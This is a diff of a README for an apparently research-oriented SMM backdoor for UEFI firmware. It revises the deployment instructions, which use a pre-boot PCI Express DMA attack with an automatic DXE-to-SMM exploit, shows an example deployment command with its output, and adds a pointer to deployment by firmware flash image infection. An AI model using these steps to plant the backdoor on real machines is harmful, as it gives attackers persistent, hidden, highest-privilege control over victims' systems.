@@ -25,7 +25,7 @@ This version of System Management Mode backdoor for UEFI based platforms was hea
 
 Project documentation is incomplete at this moment, but here's some command line examples.
 
-Deploying SMM backdoor UEFI driver with PCI Express DIY hacking toolkit using pre-boot DMA attack:
+Deploying SMM backdoor UEFI driver with PCI Express DIY hacking toolkit using pre-boot DMA attack, DXE to SMM execution transition exploit mentioned above will be started automatically once backdoor driver will be loaded:
 
 ```
 # python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi
@@ -51,6 +51,8 @@ Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c20fc
 [+] DXE driver was executed
 [+] DONE
 ```
+
+In addition, you also can deploy the backdoor using [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection) described below in the next section.
 
 Basic use of SMM backdoor `smm_backdoor.py` client program to display backdoor debug messages buffer once it was loaded and system has been booted:
 
